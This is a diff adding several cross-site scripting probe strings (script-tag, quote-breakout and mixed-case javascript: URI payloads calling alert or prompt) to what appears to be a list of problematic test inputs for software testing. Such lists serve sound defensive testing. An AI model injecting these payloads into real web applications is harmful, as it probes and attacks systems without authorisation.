@@ -227,6 +227,12 @@ Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮
 ' onfocus=alert(document.title) autofocus 
 ＜script＞alert(document.title)＜/script＞
 <sc<script>ript>alert('XSS')</sc</script>ript>
+--><script>alert(0)</script>
+";alert(0);t="
+';alert(0);t='
+JavaSCript:alert(0)
+;alert(0);
+src=JaVaSCript:prompt(9)
 
 #	SQL Injection
 #
